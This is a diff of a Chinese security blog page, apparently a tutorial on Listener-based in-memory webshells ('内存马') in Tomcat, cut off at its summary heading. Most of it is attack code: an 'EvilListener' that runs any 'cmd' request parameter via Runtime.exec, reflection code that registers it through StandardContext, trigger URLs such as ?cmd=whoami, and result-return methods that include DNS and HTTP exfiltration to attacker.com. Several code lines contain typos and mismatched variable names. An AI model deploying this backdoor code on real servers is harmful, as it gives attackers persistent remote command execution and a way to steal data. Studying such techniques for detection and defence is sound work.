@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Filter型内存马原理、实现方式、注入技巧">
+        <meta name="description" content="Listener型内存马的核心概念与实现原理、三种 Listener 类型对比、ServletRequestListener 动态注册流程（StandardContext 获取与 addApplicationEventListener）、命令执行结果回显的三种方案（Request 属性/文件/DNS 外带）、优势与局限性分析，附 Tomcat 环境实战演示">
       
       
         <meta name="author" content="ethicalpaws">
@@ -25,7 +25,7 @@
     
     
       
-        <title>Filter型内存马 - 青春沙盒</title>
+        <title>Listener型内存马 - 青春沙盒</title>
       
     
     
@@ -86,7 +86,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#filter" class="md-skip">
+        <a href="#listener" class="md-skip">
           Skip to content
         </a>
       
@@ -120,7 +120,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Filter型内存马
+              Listener型内存马
             
           </span>
         </div>
@@ -2772,10 +2772,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#listener_1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        什么是内存马
+        Listener是什么
       
     </span>
   </a>
@@ -2783,10 +2783,21 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#filter_1" class="md-nav__link">
+  <a href="#listener_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Filter型内存马原理
+        Listener型内存马核心思路
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        注册流程
       
     </span>
   </a>
@@ -2797,21 +2808,49 @@
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        实现方式
+        核心难点：命令执行结果如何回显？
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="核心难点：命令执行结果如何回显？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#requestfilterjsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存入request属性然后如果Filter或JSP读取
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        注入技巧
+        写入可访问文件
       
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dnshttp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        通过DNS或HTTP外带数据
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2819,7 +2858,29 @@
   <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
-        检测与防御
+        访问后门流程
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战
       
     </span>
   </a>
@@ -2846,12 +2907,219 @@
   
 
 
-<h1 id="filter">Filter型内存马<a class="headerlink" href="#filter" title="Permanent link">&para;</a></h1>
-<h2 id="_1">什么是内存马<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<h2 id="filter_1">Filter型内存马原理<a class="headerlink" href="#filter_1" title="Permanent link">&para;</a></h2>
-<h2 id="_2">实现方式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h2 id="_3">注入技巧<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
-<h2 id="_4">检测与防御<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h1 id="listener">Listener型内存马<a class="headerlink" href="#listener" title="Permanent link">&para;</a></h1>
+<h2 id="listener_1">Listener是什么<a class="headerlink" href="#listener_1" title="Permanent link">&para;</a></h2>
+<p>在 Java Web 中，Listener（监听器） 是一种特殊的组件，用于监听 Web 应用中发生的各种事件，并在事件发生时执行相应的代码。</p>
+<p><strong>Listener的类型</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>监听接口</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ServletContextListener</td>
+<td><code>javax.servlet.ServletContextListener</code></td>
+<td>应用启动 / 销毁时</td>
+</tr>
+<tr>
+<td>ServletRequestListener</td>
+<td><code>javax.servlet.ServletRequestListener</code></td>
+<td>请求创建 / 销毁时</td>
+</tr>
+<tr>
+<td>HttpSessionListener</td>
+<td><code>javax.servlet.http.HttpSessionListener</code></td>
+<td>Session 创建 / 销毁时</td>
+</tr>
+</tbody>
+</table>
+<p><em>在内存马场景中，ServletRequestListener 是最常用的，因为它的触发频率最高（每次请求都会触发），且不绑定特定 URL</em></p>
+<h2 id="listener_2">Listener型内存马核心思路<a class="headerlink" href="#listener_2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>利用代码执行入口，在运行时动态注册一个恶意 ServletRequestListener，使其监听每一次请求的创建事件。当请求到达时，Listener 会自动执行恶意代码，而无需访问任何特定路径。</p>
+</blockquote>
+<p><strong>恶意Listener的基本结构</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequestEvent</span><span class="p">;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequestListener</span><span class="p">;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="kd">class</span> <span class="nc">EvilListener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Listener</span><span class="p">{</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">){</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="o">=</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;!</span><span class="n">cmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">()){</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">            </span><span class="k">try</span><span class="p">{</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">            </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestoryed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">){</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<h2 id="_1">注册流程<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>核心步骤</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. 获取 StandardContext   Tomcat 的应用上下文对象
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>2. 创建恶意 Listener 实例 实现 ServletRequestListener 接口
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>3. 添加到 StandardContext  调用 addApplicationEventListener() 或 addApplicationLifecycleListener()
+</span></code></pre></div></p>
+<p><strong>完整流程</strong></p>
+<p><em>第一步：获取StandardContext</em>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">StandardContext</span><span class="w"> </span><span class="n">sct</span><span class="o">=</span><span class="kc">null</span><span class="p">:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">ClassLoader</span><span class="w"> </span><span class="n">cl</span><span class="o">=</span><span class="n">Thread</span><span class="p">.</span><span class="na">currentThread</span><span class="p">().</span><span class="na">getContextClassLoader</span><span class="p">();</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">Object</span><span class="w"> </span><span class="n">resources</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="n">cl</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="k">while</span><span class="p">(</span><span class="n">clazz</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="n">resources</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="k">try</span><span class="p">{</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">resourcesField</span><span class="o">=</span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;resources&quot;</span><span class="p">);</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">        </span><span class="n">resourcesField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">        </span><span class="n">resources</span><span class="o">=</span><span class="n">resourcesField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">cl</span><span class="p">);</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="n">e</span><span class="p">){</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">        </span><span class="n">clazz</span><span class="o">=</span><span class="n">clazz</span><span class="p">.</span><span class="na">getSuperclass</span><span class="p">();</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="p">}</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="k">if</span><span class="p">(</span><span class="n">resources</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Exception</span><span class="p">(</span><span class="s">&quot;找不到 resources 字段&quot;</span><span class="p">);</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="p">}</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resourcesclazz</span><span class="o">=</span><span class="n">resources</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="k">while</span><span class="p">(</span><span class="n">resourcesClazz</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="n">sct</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="w">    </span><span class="k">try</span><span class="p">{</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">contextField</span><span class="o">=</span><span class="n">resourcesClazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;context&quot;</span><span class="p">);</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">        </span><span class="n">contextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="w">        </span><span class="n">sct</span><span class="o">=</span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">contextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">resources</span><span class="p">);</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="w">    </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="n">e</span><span class="p">){</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="w">        </span><span class="n">resourcesClazz</span><span class="o">=</span><span class="n">resourcesClazz</span><span class="p">.</span><span class="na">getSuperclass</span><span class="p">();</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="p">}</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="k">if</span><span class="p">(</span><span class="n">sct</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Exception</span><span class="p">(</span><span class="s">&quot;找不到 context 字段&quot;</span><span class="p">);</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<p><em>第二步：创建并注册Listener</em></p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">MyListener</span><span class="w"> </span><span class="n">evilListener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MyListener</span><span class="p">();</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">sct</span><span class="p">.</span><span class="na">addApplicationEventListener</span><span class="p">(</span><span class="n">evilListener</span><span class="p">);</span>
+</span></code></pre></div>
+<p><em>第三步：触发后门</em></p>
+<blockquote>
+<p>注册成功后，任何请求 只要携带 ?cmd=whoami 参数，Listener 就会执行命令</p>
+</blockquote>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://localhost:8080/index.html?cmd=whoami
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>http://localhost:8080/memshell/servlet_inject.jsp?cmd=id
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>http://localhost:8080/任意路径?cmd=ls
+</span></code></pre></div>
+<h2 id="_2">核心难点：命令执行结果如何回显？<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Listener 的方法签名为 requestInitialized(ServletRequestEvent sre)，参数中没有 ServletResponse，也没有 PrintWriter，因此无法直接将命令执行结果返回给客户端。</p>
+</blockquote>
+<h3 id="requestfilterjsp">存入request属性然后如果Filter或JSP读取<a class="headerlink" href="#requestfilterjsp" title="Permanent link">&para;</a></h3>
+<p><div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">){</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="o">=</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;!</span><span class="n">cmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">()){</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">        </span><span class="k">try</span><span class="p">{</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="o">=</span><span class="n">execCommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;evil_result&quot;</span><span class="p">,</span><span class="n">result</span><span class="p">);</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">            </span><span class="n">req</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;evil_result&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Error: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="p">}</span>
+</span></code></pre></div>
+然后通过一个独立的 JSP 读取并显示：
+<code>&lt;%=request.getAttribute("evil_result") %&gt;</code></p>
+<h3 id="_3">写入可访问文件<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p><div class="language-java highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">String</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="o">=</span><span class="n">execCommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s">&quot;/usr/local/tomcat/webapps/ROOT/result.txt&quot;</span><span class="p">;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">FileWriter</span><span class="w"> </span><span class="n">fw</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">FileWriter</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">fw</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">fw</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+</span></code></pre></div>
+然后访问 http://localhost:8080/result.txt 查看结果。</p>
+<h3 id="dnshttp">通过DNS或HTTP外带数据<a class="headerlink" href="#dnshttp" title="Permanent link">&para;</a></h3>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="o">=</span><span class="n">execCommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">InterAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.attacker.com&quot;</span><span class="p">);</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1">//或者发送http请求</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">HttpURLConnection</span><span class="w"> </span><span class="n">conn</span><span class="o">=</span><span class="p">(</span><span class="n">HttpURLConnection</span><span class="p">)</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&quot;http://attacker.com/log?data=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">URLEncoder</span><span class="p">.</span><span class="na">encode</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;UTF-8&quot;</span><span class="p">)).</span><span class="na">openConnection</span><span class="p">();</span>
+</span></code></pre></div>
+<h2 id="_4">访问后门流程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>用户访问任意页面 ?cmd=whoami
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    ↓
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Tomcat 接收请求
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    ↓
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>触发事件 → ServletRequestInitialized 事件
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>    ↓
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>执行 EvilListener.requestInitialized()
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>    ↓
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>检测到 cmd 参数
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    ↓
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>Runtime.exec() 执行命令
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>    ↓
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>结果存入 request.setAttribute(&quot;listener_result&quot;)
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>    ↓
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>（后续）访问 show_result.jsp → 输出结果
+</span></code></pre></div>
+<h2 id="_5">总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
